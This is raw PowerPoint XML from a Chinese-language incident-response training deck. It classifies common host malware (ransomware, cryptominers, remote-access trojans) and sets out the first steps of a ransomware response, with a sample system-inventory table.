                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>常见事件和案例分析</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1119208371"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:transition>
    <p:fade/>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DAD9AE-46A1-1E44-8534-0DA3C620BA6F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="539552"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常见应急事件</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12290" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="712753" y="1958170"/>
            <a:ext cx="7776864"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285750" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>勒索病毒 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>特征即磁盘文件被加密，一旦完成勒索过程则无法恢复文件，因此这类病毒以预防为主，安装杀毒软件并做好主机防黑工作及时打补丁，对重要文件要及时隔离备份；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
              <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>挖矿木马 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>特征即</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>CPU</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>和</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>GPU</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>异常占用过高，且有对矿池地址的解析。目前挖矿木马表现可有落地文件实现也可通过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>WMI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>等无落地文件实现；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
              <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>远控木马 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>一直是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>APT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>攻击的主流，复杂程度高，其特点是集成了攻击模块、控制模块、持久化模块等且有</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>C2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>服务器；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
              <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>普通木马 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>代指除开以上类型的其余木马类型等。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="712753" y="1588838"/>
            <a:ext cx="7632848" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>目前根据主机受到的攻击的表象可将木马病毒分为四类：</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="21033348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wipe(up)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="75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692696"/>
            <a:ext cx="6453018" cy="5616624"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="28575">
            <a:solidFill>
              <a:srgbClr val="0066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5C460245-A818-FC4B-952D-86AB464A0847}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="1412776"/>
            <a:ext cx="648072" cy="3888432"/>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勒索病毒处置流程</a:t>
            </a:r>
            <a:endParaRPr sz="2800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="7229516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wipe(left)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="13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F07963-D399-D949-AA2A-F93B82668C43}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568"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了解现状</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14338" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1259632" y="1772816"/>
            <a:ext cx="6630366"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285750" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>第一时间了解目前什么情况：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
            </a:pPr>
            <a:endParaRPr lang="en-US"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r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>文件被加密？</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"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endParaRPr lang="zh-CN"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r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>设备无法正常启动？</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"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endParaRPr lang="zh-CN"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r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>勒索信息展示？</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"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endParaRPr lang="zh-CN"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r>
              <a:rPr lang="zh-CN" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>桌面有新的文本文件并记录加密信息及解密联系方式？</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
              <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" b="1" dirty="0">
              <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36417798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up)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>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DB1D9C-9ED1-8E49-90C0-28B15802DA05}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="119675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了解</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>发病</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>时间</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15362" name="文本框 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1259632" y="2060848"/>
            <a:ext cx="676875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285750" indent="-285750">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="u"/>
              <a:defRPr kumimoji="1" sz="2000" b="1">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文件加密时间？</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>设备无法正常启动的时间？</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>新的文本文件的出现时间？</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>了解事件发生时间，后面以此时间点做排查重点；</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12254003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wipe(up)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="5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D3CF2B-3FA9-A741-B47F-CB643EBB958E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="557199"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了解系统架构</a:t>
            </a:r>
            <a:endParaRPr sz="2800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65"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477976815"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="88982" y="1988840"/>
          <a:ext cx="9019522" cy="3138489"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr>
                <a:effectLst>
                  <a:outerShdw blurRad="50800" dist="38100" dir="10800000" algn="r" rotWithShape="0">
                    <a:prstClr val="black">
                      <a:alpha val="40000"/>
                    </a:prstClr>
                  </a:outerShdw>
                </a:effectLst>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1962738">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3931230391"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1368152">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1310586875"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1224136">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3386125988"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1152128">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3069660839"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1152128">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="4226103514"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1080120">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="71772251"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1080120">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3885254725"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="547688">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系统名称</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地址</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端口开放</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物理机</a:t>
                      </a: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a:t>
                      </a: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虚拟机</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="zh-CN" sz="12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主机名</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设备型号</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操作系统类型</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="0" lang="zh-CN" altLang="zh-CN" sz="12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extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3023245683"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="456010">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BIDW</a:t>
                      </a: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（数据库）节点</a:t>
                      </a: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01</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10.2xx.xx.xx</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80</a:t>
                      </a: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a:t>
                      </a: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22</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物理机</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Bnnnn</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IBM P595</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AIX</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4209532129"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="454819">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操作系统版本</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管理后台</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="0" lang="en-US"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IP</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="0" lang="zh-CN"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地址</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中间件类型</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中间件版本</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数据库类型</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数据库版本</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应用</a:t>
                      </a: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URL</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3085306407"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="456010">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AIX 5.3</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10.xx.xxx.79</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was</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6.1.0.47</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oracle</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V11g</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gmcc.net</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495110369"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="61198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应用端口</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储存设备类型</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储存设备型号</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web</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="0" lang="zh-CN"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框架</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中间件版本</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第三方组件</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212769665"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="61198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80</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磁带库</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3584/L52</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struts</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2.4</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编辑器</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482326893"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32432771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B3A82-DC2E-3348-A229-37E19AE14B70}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="755576" y="112474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确认感染者</a:t>
            </a:r>
            <a:endParaRPr sz="2800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65"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903439490"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="107504" y="2204864"/>
          <a:ext cx="8928994" cy="2882505"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr>
                <a:effectLst>
                  <a:outerShdw blurRad="50800" dist="38100" algn="l" rotWithShape="0">
                    <a:prstClr val="black">
                      <a:alpha val="40000"/>
                    </a:prstClr>
                  </a:outerShdw>
                </a:effectLst>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1512168">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="546304917"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1584176">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1594024642"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1368152">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1899277170"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1152128">
                  <a:extLst>
